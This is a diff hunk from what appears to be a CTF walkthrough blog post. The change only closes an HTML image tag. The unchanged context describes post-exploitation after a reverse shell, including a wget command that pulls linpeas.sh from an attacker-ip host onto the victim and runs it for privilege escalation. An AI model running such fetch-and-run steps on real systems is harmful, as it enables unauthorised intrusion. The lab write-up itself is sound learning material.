@@ -86,8 +86,8 @@ Now we got a reverse shell, we need to now escalate our privileges to become roo
 Now on the victim server we will download linpeas script being hosted on my server. The following is the command for downloading the script using wget: -    
 ```wget http://<attacker-ip>:8000/linpeas.sh```    
 <p>
- <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/12_installing_linpeas.png"
-</p>   
+ <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/12_installing_linpeas.png">    
+</p>    
 once linpeas script is downloaded in the victim machine, we will make the file executable and run the script. The following are the commands.    
 ```chmod + x linpeas.sh```    
 ```./linpeas.sh```    
